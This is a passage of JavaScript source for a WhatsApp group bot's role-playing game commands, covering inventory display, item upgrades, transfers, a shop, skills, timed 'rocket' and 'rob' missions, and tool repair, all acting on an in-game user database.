  if (!(who in global.db.users)) return replynano(`User ${who} not in database`)

  let sortedlevel = Object.entries(global.db.users).sort((a, b) => b[1].level - a[1].level)
  let userslevel = sortedlevel.map(v => v[0])
  let sortedchip = Object.entries(global.db.users).sort((a, b) => b[1].chip - a[1].chip)
  let userschip = sortedchip.map(v => v[0])
  let sortedmoney = Object.entries(global.db.users).sort((a, b) => b[1].money - a[1].money)
  let usersmoney = sortedmoney.map(v => v[0])
  let sorteddiamond = Object.entries(global.db.users).sort((a, b) => b[1].diamond - a[1].diamond)
  let usersdiamond = sorteddiamond.map(v => v[0])
  let sortedbank = Object.entries(global.db.users).sort((a, b) => b[1].bank - a[1].bank)
  let usersbank = sortedbank.map(v => v[0])
  let sortedgold = Object.entries(global.db.users).sort((a, b) => b[1].gold - a[1].gold)
  let usersgold = sortedgold.map(v => v[0])

  let isMods = [LordVoltage.decodeJid(LordVoltage.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
  let DanzTheCreator = m.fromMe || isMods || [LordVoltage.decodeJid(LordVoltage.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
  let isPrems =  DanzTheCreator || new Date() - user.premiumTime < 0

  let limit = isPrems ? 'Unlimited' : user.limit
  let tools = Object.keys(inventory.tools).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${typeof inventory.tools[v] === 'object' ? inventory.tools[v][user[v]?.toString()] : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
  let items = Object.keys(inventory.items).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let dura = Object.keys(inventory.durabi).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let crates = Object.keys(inventory.crates).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let pets = Object.keys(inventory.pets).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v] >= inventory.pets[v] ? 'Max Levels' : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
  let cooldowns = Object.entries(inventory.cooldowns).map(([cd, { name, time }]) => cd in user && `*✧ ${name}*: ${new Date() - user[cd] >= time ? '🙂' : '❌'}`).filter(v => v).join('\n').trim()

  let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : LordVoltage.getName(who)}* ${user.level ? `
➠ ${global.rpg.emoticon('level')} level: ${user.level}` : ''} ${user.limit ? `
➠ ${global.rpg.emoticon('limit')} limit: ${limit}` : ''}
${Object.keys(inventory.others).map(v => user[v] && `➠ ${global.rpg.emoticon(v)} ${v}: ${user[v]}`).filter(v => v).join('\n')} ${tools ? `

*ʟɪꜱᴛ ᴛᴏᴏʟs* :
${tools}` : ''}${items ? `

*ʟɪꜱᴛ ɪᴛᴇᴍs* :
${items}` : ''}${crates ? `

*ʟɪꜱᴛ ᴄʀᴀᴛᴇs* :
${crates}` : ''}${pets ? `

*ʟɪꜱᴛ ᴩᴇᴛs* :
${pets}` : ''}${cooldowns ? `

*ʟɪꜱᴛ ᴀʀᴄʜɪᴇᴠᴇᴍᴇɴᴛ* :
${global.rpg.emoticon('chip')} ᴛᴏᴘ ᴄʜɪᴘ *${userschip.indexOf(who) + 1}* ᴅᴀʀɪ *${userschip.length}*
${global.rpg.emoticon('money')} ᴛᴏᴘ ᴍᴏɴᴇʏ *${usersmoney.indexOf(who) + 1}* ᴅᴀʀɪ *${usersmoney.length}*
${global.rpg.emoticon('bank')} ᴛᴏᴘ ʙᴀɴᴋ *${usersbank.indexOf(who) + 1}* ᴅᴀʀɪ *${usersbank.length}*
${global.rpg.emoticon('level')} ᴛᴏᴘ ʟᴇᴠᴇʟ *${userslevel.indexOf(who) + 1}* ᴅᴀʀɪ *${userslevel.length}*
${global.rpg.emoticon('diamond')} ᴛᴏᴘ ᴅɪᴀᴍᴏɴᴅ *${usersdiamond.indexOf(who) + 1}* ᴅᴀʀɪ *${usersdiamond.length}*
${global.rpg.emoticon('gold')} ᴛᴏᴘ ɢᴏʟᴅ *${usersgold.indexOf(who) + 1}* ᴅᴀʀɪ *${usersgold.length}*

♻️ *ᴄᴏʟʟᴇᴄᴛ ʀᴇᴡᴀʀᴅs* :
${cooldowns}` : ''}
*✧ dungeon: ${user.lastdungeon == 0 ? '🙂': '❌'}*
*✧ mining: ${user.lastmining == 0 ? '🙂': '❌'}*
`.trim()

    replynano(`${caption}`)
}}
break
//==================================================================
case 'upgrade': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
        let user = global.db.users[m.sender]
        let wood = user.wood * 1
        let rock = user.rock * 1
        let string = user.string * 1
        let money = user.money * 1
        let iron = user.iron * 1
        let fishingrod = user.fishingrod * 1
        let pickaxe = user.pickaxe * 1
        let sword = user.sword * 1
        let diamond = user.diamond * 1
        let emerald = user.emerald * 1
        let armor = user.armor * 1
        let atm = user.atm
        let type = (args[0] || '').toLowerCase()
        let prefix = command
        
        let teks = `█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Use Formats *${command} [type]*
Example *${command} fishingRod*

*📌List that can be upgraded*
${rpg.emoticon('fishingrod')}FishingRod
${rpg.emoticon('pickaxe')}Pickaxe
${rpg.emoticon('sword')}Sword
${rpg.emoticon('armor')}Armor
${rpg.emoticon('atm')}Atm
`.trim()
        
        switch (type) {
            case 'fishingrod':
                if (fishingrod == 0) {
                    let lmao = `you don't have *🎣FishingRod* to get it type *${command}craft fishingrod*`
                    return reply(`${lmao}`)
                }
                if (fishingrod > 9) return reply(`*${rpg.emoticon('fishingrod')}FishingRod* you are at max level`)
                let _wood = fishingrod * 100
                let _string = fishingrod * 100
                let _money = fishingrod * 1000000
                if (wood < _wood || string < _string || money < _money) return reply(`Your materials are lacking!!${wood < _wood ? `\n${rpg.emoticon('wood')}your wood is lacking *${_wood - wood}*` : ''}${string < _string ? `\n${rpg.emoticon('string')}String Kamu Kurang *${_string - string}*` : ''}${user.money < _money ? `\n${rpg.emoticon('money')}Your money is less *${_money - money}*` : ''}`)
                user.fishingrod += 1
                user.wood -= _wood * 1
                user.string -= _string * 1
                user.money -= _money * 1
                user.fishingroddurability = 0 
                user.fishingroddurability += fishingrod * 50
                reply(`Successful upgrade *${rpg.emoticon('fishingrod')}FishingRod*`)
                break
            case 'pickaxe':
                if (pickaxe == 0) {
                    let lmao = `you don't have yet *${rpg.emoticon('pickaxe')}Pickaxe*
to have it tap *${command}craft Pickaxe*`
                    return reply(`${lmao}`)
                }
                if (pickaxe > 9) return reply(`*${rpg.emoticon('pickaxe')}Pickaxe* you are at max level!!`)
                let __rock = pickaxe * 250
                let __wood = pickaxe * 150
                let __money = pickaxe * 1500000
                if (rock < __rock || wood < __wood || money < __money) return reply(`
Your Material is Insufficient!!
${rock < __rock ? `\n${rpg.emoticon('rock')}rock kamu kurang *${__rock - rock}*` : ''}${wood < __wood ? `\n${rpg.emoticon('wood')}your wood is lacking *${__wood - wood}*` : ''}${money < __money ? `\n${rpg.emoticon('money')}Your money is less *${__money - money}*` : ''}`)
                user.pickaxe += 1
                user.wood -= __wood * 1
                user.rock -= __rock * 1
                user.money -= __money * 1
                user.pickaxedurability = 0
                user.pickaxedurability += pickaxe * 50
                reply(`Successful upgrade *${rpg.emoticon('pickaxe')}Pickaxe*`)
                break
            case 'sword':
                if (sword == 0) {
                    let lmao = `you don't have yet *${rpg.emoticon('sword')}Sword*
to have it tap *${command}craft sword*`
                    return reply(`${lmao}`)
                }
                if (sword > 9) return reply(`*${rpg.emoticon('sword')}Sword* you are at max level!!`)
                let _iron = sword * 250
                let ___wood = sword * 150
                let ___money = sword * 1000000
                if (iron < _iron || wood < ___wood || money < ___money) return reply(`
Your Material is Insufficient!!
${iron < _iron ? `\n${rpg.emoticon('iron')}Your iron is low *${_iron - iron}*` : ''}${wood < ___wood ? `\n${rpg.emoticon('wood')}your wood is lacking *${___wood - wood}*` : ''}${money < ___money ? `\n${rpg.emoticon('money')}Your money is less *${___money - money}*` : ''}`)
                user.sword += 1
                user.iron -= _iron * 1
                user.wood -= ___wood * 1
                user.money -= ___money * 1
                user.sworddurability = 0 
                user.sworddurability += sword * 50 
                reply(`Successful upgrade *${rpg.emoticon('sword')}Sword*`)
                break
                case 'armor':
                if (armor == 0) {
                    let lmao = `you don't have yet *${rpg.emoticon('armor')}Armor*
to have it tap *${command}craft armor*`
                    return reply(`${lmao}`)
                }
                if (armor > 9) return reply(`*${rpg.emoticon('armor')}Armor* you are at max level!!`)
                let _diamond = armor * 5
                let ____wood = armor * 150
                let ____money = armor * 1000000
                if (diamond < _diamond || wood < ____wood || money < ____money) return reply(`
Your Material is Insufficient!!
${diamond < _diamond ? `\n${rpg.emoticon('diamond')}Your diamonds are low *${_diamond - diamond}*` : ''}${wood < ____wood ? `\n${rpg.emoticon('wood')}your wood is lacking *${____wood - wood}*` : ''}${money < ____money ? `\n${rpg.emoticon('money')}Your money is less *${____money - money}*` : ''}`)
                user.armor += 1
                user.diamond -= _diamond * 1
                user.wood -= ____wood * 1
                user.money -= ____money * 1
                user.armordurability = 0 
                user.armordurability += sword * 50 
                reply(`Successful upgrade *${rpg.emoticon('armor')}Armor*`)
                break
                case 'atm':
                if (atm == 0) {
                    let lmao = `you don't have yet *${rpg.emoticon('atm')}Atm*
to have it tap *${command}craft atm*`
                    return reply(`${lmao}`)
                }
                if (atm > 999) return reply(`*${rpg.emoticon('atm')}Atm* you are at max level!!`)
                let __diamond = atm * 3
                let _emerald = atm * 5
                let _____money = atm * 10000
                if (diamond < __diamond || emerald < _emerald || money < _____money) return reply(`
Your Material is Insufficient!!
${diamond < __diamond ? `\n${rpg.emoticon('diamond')}Your diamonds are low *${__diamond - diamond}*` : ''}${emerald < _emerald ? `\n${rpg.emoticon('emerald')}Emerald kamu kurang *${_emerald - emerald}*` : ''}${money < _____money ? `\n${rpg.emoticon('money')}Your money is less *${_____money - money}*` : ''}`)
                user.atm += 1
                user.diamond -= __diamond * 1
                user.emerald -= _emerald * 1
                user.money -= _____money * 1
                user.fullatm = 0 
                user.fullatm += atm * 500000000
                reply(`Successful upgrade *${rpg.emoticon('atm')}Atm*`)
                break
            default :
                return reply(`${teks}`)
        }
}}
break
//==================================================================
case 'transfer': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function special(type) {
    let b = type.toLowerCase()
    let special = (['common', 'uncommon', 'mythic', 'legendary', 'pet'].includes(b) ? ' Crate' : '')
    return special
}

function isNumber(x) {
    return !isNaN(x)
}
const items = [
    'money', 'bank', 'potion', 'trash', 'wood',
    'rock', 'string', 'petFood', 'emerald',
    'diamond', 'gold', 'iron', 'common',
    'uncommon', 'mythic', 'legendary', 'pet', 'chip', 
    'grape', 'apple', 'orange', 'mango', 'banana', 
    'grape seeds', 'apple seeds', 'orange seeds', 'mango seeds', 'banana seeds',
]
    let user = global.db.users[m.sender]
    const item = items.filter(v => v in user && typeof user[v] == 'number')
    let lol = `Use format ${command} [type] [value] [number]
example ${command} money 9999 @234xxxxxx

📍 Transferable items
${item.map(v => `${rpg.emoticon(v)}${v}`.trim()).join('\n')}
`.trim()
    const type = (args[0] || '').toLowerCase()
    if (!item.includes(type)) return reply(lol)
    const count = Math.min(Number.MAX_SAFE_INTEGER, Math.max(1, (isNumber(args[1]) ? parseInt(args[1]) : 1))) * 1
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[2] ? (args[2].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
    let _user = global.db.users[who]
    if (!who) return m.reply('Tag one, or type the Number!!')
    if (!(who in global.db.users)) return m.reply(`User ${who} not in database`)
    if (user[type] * 1 < count) return m.reply(`Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${count - user[type]}*`)
    let previous = user[type] * 1
    let _previous = _user[type] * 1
    user[type] -= count * 1
    _user[type] += count * 1
    if (previous > user[type] * 1 && _previous < _user[type] * 1) m.reply(`*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(type)} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
    else {
        user[type] = previous
        _user[type] = _previous
        m.reply(`*––––––『 TRANSFER 』––––––*\n*📊 Status:* Failted\n*📍 Item:* ${count} ${rpg.emoticon(type)}${type}${special(type)}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
    }
}}
break
//==================================================================
case 'buy': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function isNumber(number) {
    if (!number) return number
    number = parseInt(number)
    return typeof number == 'number' && !isNaN(number)
}

function capitalize(word) {
  return word.charAt(0).toUpperCase() + word.substr(1)
}
const items = {
    buy: {
        limit: {
            exp: 9999
        },
        chip: {
        	money: 1000000
        },
        exp: {
        	money: 1000
        },
        potion: {
            money: 1250
        },
        trash: {
            money: 40
        },
        wood: {
            money: 700
        },
        rock: {
            money: 850
        },
        string: {
            money: 400
        },
        iron: { 
        	money: 3000
        },
        diamond: {
            money: 500000
        },
        emerald: {
            money: 100000
        },
        gold: {
            money: 100000
        },
        common: {
            money: 2000
        },
        uncommon: {
            money: 20000
        },
        mythic: {
            money: 75000
        },
        legendary: {
            money: 200000
        },
        petfood: {
            money: 3500
        },
        pet: {
            money: 120000
        },
        Wine: {
            money: 2000
        },
        Apple: {
            money: 2000
        },
        Orange: {
            money: 2000
        },
        bait: {
            money: 5000
        },
        Banana: {
        	money: 2000
        },
        GrapeSeeds: {
            money: 2000
        },
        AppleSeeds: {
            money: 2000
        },
        OrangeSeeds: {
            money: 2000
        },
        MangoSeeds: {
            money: 2000
        },
        BananaSeeds: {
            money: 2000
        },
        mango: {
        	money: 2000
        }     
    },
    sell: {
        limit: {
            exp: 999
        },
        exp: {
        	money: 1
        },
        chip: {
        	money: 1000000
        },
        potion: {
            money: 625
        },
        trash: {
            money: 20
        },
        wood: {
            money: 350
        },
        rock: {
            money: 425
        },
        string: {
            money: 200
        },
        iron: { 
        	money: 1500
        },
        diamond: {
            money: 250000
        },
        emerald: {
            money: 50000
        },
        gold: {
            money: 50000
        },
        common: {
            money: 1000
        },
        uncommon: {
            money: 10000
        },
        mythic: {
            money: 37500
        },
        legendary: {
            money: 100000
        },
        petfood: {
            money: 1750
        },
        pet: {
            money: 60000
        },
        wine: {
            money: 1000
        },
        apple: {
            money: 1000
        },
        orange: {
            money: 1000
        },
        bait: {
            money: 2500
        },
        banana: {
        	money: 1000
        },
        grapeseeds: {
            money: 1000
        },
        appleseeds: {
            money: 1000
        },
        orangeseeds: {
            money: 1000
        },
        mangoseeds: {
            money: 1000
        },
        bebeaten: {
            money: 1000
        },
        mango: {
        	money: 1000
        }
    }
}

    const item = (args[0] || '').toLowerCase()
    if (!item.match('limit') && db.chats[m.chat].rpg == false && m.isGroup) return dfail('rpg', m, LordVoltage)
    let user = db.users[m.sender]
    const listItems = Object.fromEntries(Object.entries(items[command.toLowerCase()]).filter(([v]) => v && v in user))
    let text = ''
    let footer = ''
    let image = ''
    let buttons = ''
    text = (command.toLowerCase() == 'buy' ?
(`
*${decor.htki} 𝙱𝚄𝚈𝙸𝙽𝙶 ${decor.htka}*
`.trim()) : 
(`
*${decor.htki} 𝚂𝙴𝙻𝙻𝙸𝙽𝙶 ${decor.htka}*
`.trim())
)
    footer = (command.toLowerCase() == 'buy' ?
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim()) : 
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
        let paymentMethod = Object.keys(listItems[v]).find(v => v in user)
        return `➠ 1 ${rpg.emoticon(v)} ${capitalize(v)} ﹫ ${listItems[v][paymentMethod]} ${rpg.emoticon(paymentMethod)}${capitalize(paymentMethod)}`.trim()
    }).join('\n')}
–––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
➠ ᴛᴏ sᴇʟʟ ɪᴛᴇᴍs:
${command} [item] [quantity]
▧ ᴇxᴀᴍᴩʟᴇ:
${command} potion 10
`.trim())
)
    
    const total = Math.floor(isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 1), Number.MAX_SAFE_INTEGER) : 1) * 1
    if (!listItems[item]) return m.reply(footer)
    if (command.toLowerCase() == 'buy') {
        let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
        if (user[paymentMethod] < listItems[item][paymentMethod] * total) return m.reply(`You need *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Again, To Buy *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. You just have *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
        user[paymentMethod] -= listItems[item][paymentMethod] * total
        user[item] += total
        return reply(`Selling Success *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Worth *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
    } else {
    	let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
        if (user[item] < total) return m.reply(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
        user[item] -= total
        user[paymentMethot] += listItems[item][paymentMethot] * total
        return reply(`Selling Success *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Worth *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
    }
}}
break
//==================================================================
case 'selectskill': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
let user = global.db.users[m.sender]
let skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
let bintang = {
"One": "⭐",
"Two": "⭐⭐",
"Three": "⭐⭐⭐",
"Four": "⭐⭐⭐⭐",
"Five": "⭐⭐⭐⭐⭐",
"Six": "⭐⭐⭐⭐⭐⭐"
}
   let skil = text.trim().toLowerCase() // to filter text
   if (!skill.includes(skil)) return reply( `Select *skill🃏* what do you want:

${skill.map(skil => `› ${skil}`).join('\n')}

How To use:
${command} <nameskill>
     
Example:
${command} necromancer
`)
    if (user.skill == "") {
        user.skill = skil
        m.reply(`You have selected a Skill ${skil}`)
    } else if (user.skill) {
        m.reply(`You Already Have the skill ${user.skill} Cannot be replaced`)
    }
}}
break
//==================================================================
case 'sampah':
case 'rubbish': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
const rewards = {
    exp: 500,
    money: 20999,
}

const cooldown = 2592000000
    let user = global.db.users[m.sender]
    if (new Date - user.lastmonthly < cooldown) return reply( `You have already claimed this monthly claim, wait for *${((user.lastmonthly + cooldown) - new Date()).toTimeString()}*`.trim())
    let text = ''
    for (let reward of Object.keys(rewards)) if (reward in user) {
        user[reward] += rewards[reward]
        text += `*+${rewards[reward]}* ${rpg.emoticon(reward)}${reward}\n`
    }
    reply('*––––––『 HAPPY 』––––––*\n' + text.trim())
    user.lastmonthly = new Date * 1
}}
break

//==================================================================
case 'roket':
case 'rocket': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let user = global.db.users[m.sender]
    let order = global.db.users[m.sender].rokets
    let timers = clockString(_timers)
    let name = user.registered ? user.name: LordVoltage.getName(m.sender)
    let id = m.sender
    let kerja = 'Roket'
    LordVoltage.misi = LordVoltage.misi ? LordVoltage.misi: {}
    if (id in LordVoltage.misi) {
        reply( `Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
        throw false
    }
    if (user.health < 80) return m.reply(`You Must Have a Minimum of 80Health`)
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let ngerok4 = Math.floor(Math.random() * 10)
        let ngerok5 = Math.floor(Math.random() * 10)

        let ngrk4 = (ngerok4 * 100000)
        let ngrk5 = (ngerok5 * 1000)

        let rokit = `🌕


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████
🚀

👨‍🚀 Starting flight....
`.trim()

        let rokit2 = `🌕


🚀
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ In flight....
`.trim()

        let rokit3 = `🌕🚀


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Arrive at your destination....
`.trim()

        let rokit4 = `🌕🚀

➕ Successful Landing.... 👨‍🚀
`.trim()

        let hsl = `
*—[ Skyrocketing Results ${name} ]—*
➕ 🙂 Money = [ ${ngrk4} ]
➕ 🙂 Exp = [ ${ngrk5} ]
➕ 😍 Landing Complete = +1
➕  📥Previous Landing Total : ${order}
`.trim()

        user.money += ngrk4
        user.exp += ngrk5
        user.rokets += 1
        user.health -= 80

		LordVoltage.misi[id] = [
            kerja,
            setTimeout(() => {
                delete LordVoltage.misi[id]
            }, 27000)
        ]
        
        setTimeout(() => {
            reply( hsl)
        }, 27000)

        setTimeout(() => {
            reply( rokit4)
        }, 25000)

        setTimeout(() => {
            reply( rokit3)
        }, 20000)

        setTimeout(() => {
            reply( rokit2)
        }, 15000)

        setTimeout(() => {
            reply( rokit)
        }, 10000)

        setTimeout(() => {
            reply( `🔍 ${name} Search for Location.....`)
        }, 0)
        user.lastmisi = new Date * 1
    } else m.reply(`Please wait for ${timers}, to complete the mission again`)
    }}
    break
//==================================================================
case 'rob':
case 'robery': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let user = global.db.users[m.sender]
    let __timers = (new Date - user.lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers)
    let id = m.sender
    let kerja = 'Rob'
    LordVoltage.misi = LordVoltage.misi ? LordVoltage.misi : {}
    if (id in LordVoltage.misi) {
        reply( `Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
        throw false
    }
    if (user.health < 80) return reply('You Must Have a Minimum of 80Health')
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let rndm1 = Math.floor(Math.random() * 10)
        let rndm2 = Math.floor(Math.random() * 10)
        
        let ran1 = (rndm1 * 100000)
        let ran2 = (rndm2 * 1000)

        let jln = `
🏘️          🚗

✔️ Aiming at the target....
`.trim()

        let jln2 = `
🏘️     🚶

➕ Initiate action....
`.trim()

        let jln3 = `
🏘️

➕ Rob....
`.trim()

        let jln4 = `
🚗



🏘️🚓

➕ 🙂Managed to escape....
`.trim()

        let hsl = `
*—[ Hasil rob ]—*

➕ 🙂 Money = [ ${ran1} ]
➕ 🙂 Exp = [ ${ran2} ]
➕ 📦 Rob Done = +1

And your health decreases -80
`.trim()
        user.money += ran1
        user.exp += ran2
        user.health -= 80

		LordVoltage.misi[id] = [
        kerja,
        setTimeout(() => {
            delete LordVoltage.misi[id]
        }, 27000)
    	]
    
        setTimeout(() => {
            reply(hsl)
        }, 27000)

        setTimeout(() => {
            reply(jln4)
        }, 25000)

        setTimeout(() => {
            reply(jln3)
        }, 20000)

        setTimeout(() => {
            reply(jln2)
        }, 15000)

        setTimeout(() => {
            reply(jln)
        }, 10000)

        setTimeout(() => {
            reply('🔍Looking for a House.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else reply(`Please wait for ${timers}, to complete the mission again`)
    }}
    break
//==================================================================
case 'repair': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const {default: MessageType } = require ('baileys')

  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  global.db.users[m.sender].pickaxe = global.db.users[m.sender].pickaxe || 0
  global.db.users[m.sender].sword = global.db.users[m.sender].sword || 0
  global.db.users[m.sender].fishingrod = global.db.users[m.sender].fishingrod || 0
  global.db.users[m.sender].armor = global.db.users[m.sender].armor || 0
  let botol = global.botwm

let lgocraft = `
*「 R E P A I R」*`

  let caption = `
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼

*❏ RECIPE*
▧ Pickaxe ⛏️
〉  20 Rock
〉 20 Wood
〉 20 Iron
〉 1 Diamond

▧ Sword ⚔️
〉 20 Wood
〉 20 Iron
〉 2 Gold
〉 1 Diamond

▧ FishingRod ⚔️
〉 20 Wood
〉 20 String
〉 20 Iron
〉 1 Diamond

▧ Armor 🥼
〉 15 Iron
〉 2 Gold
〉 1 Diamond
`
const sections = [
   {
	title: "REPAIR A TOOLS",
	rows: [
	    {title: "SWORD ⚔️", rowId: ".repair sword", description: "Repair Sword"},
	    {title: "PICKAXE ⛏️", rowId: ".repair pickaxe", description: "Repair Pickaxe"},
	    {title: "FISHINGROD 🥼", rowId: ".repair fishingrod", description: "Repair FishingRod"},
	    {title: "ARMOR 🥼", rowId: ".repair armor", description: "Repair Armor"},
	]
    },
]

const listMessage = {
  text: caption,
  footer: wm,
  title: lgocraft,
  buttonText: "R E P A I R",
  sections
}

  try {
    if (/repair/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'pickaxe':
          if (user.pickaxedurability > 99) return m.reply('This tool has no damage yet')
          if (user.pickaxe == 0) return m.reply('You dont have this yet')
            if(user.diamond < 1 || user.rock < 20 || user.wood < 20 || user.iron < 20 ) return m.reply(`Not enough goods!`)
             user.rock -= 20
             user.wood -= 20
             user.iron -= 20
             user.diamond -= 1
             user.pickaxedurability = 100
            m.reply("Successful repair!")
            break
          case 'sword':
          if (user.sworddurability > 99) return m.reply('This tool has no damage yet')
          if (user.sword == 0) return m.reply('You dont have this yet')
            if(user.diamond < 1 || user.wood < 20 || user.iron < 20 || user.gold < 2 ) return m.reply(`Not enough goods!`)
             user.wood -= 20
             user.iron -= 20
             user.gold -= 3
             user.diamond -= 1
             user.sworddurability = 100
            m.reply("Successful repair!")
            break
            case 'fishingrod':
          if (user.fishingroddurability > 99) return m.reply('This tool has no damage yet')
          if (user.fishingrod == 0) return m.reply('You dont have this yet')
            if(user.diamond < 1 || user.string < 20 || user.wood < 20 || user.iron < 20 ) return m.reply(`Not enough goods!`)
             user.wood -= 20
             user.string -= 20
             user.iron -= 20
             user.diamond -= 1
             user.fishingroddurability = 100
            m.reply("Successful repair!")
            break
            case 'armor':
          if (user.armordurability > 99) return m.reply('Tools ini belum memiliki kerusakan')
          if (user.armor == 0) return m.reply('Kamu belum memilik ini')
            if(user.diamond < 1 || user.iron < 15 || user.gold < 2 ) return m.reply(`Not enough goods!`)
             user.iron -= 15
             user.gold -= 2
             user.diamond -= 1
             user.armordurability = 100
            m.reply("Successful repair!")
            break
          default:
            return await LordVoltage.sendMessage(m.chat, listMessage)
        }
    } else if (/enchant|enchan/i.test(command)) {
      const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
      switch (_type) {
        case 't':
          break
        case '':
          break

        default:
          return LordVoltage.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
      }
    }
  } catch (err) {
    m.reply("Error\n\n\n" + err.stack)
  }
}}
break
//==================================================================
case 'referral': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
const { crypto } = require ("crypto")
const xp_first_time = 2500
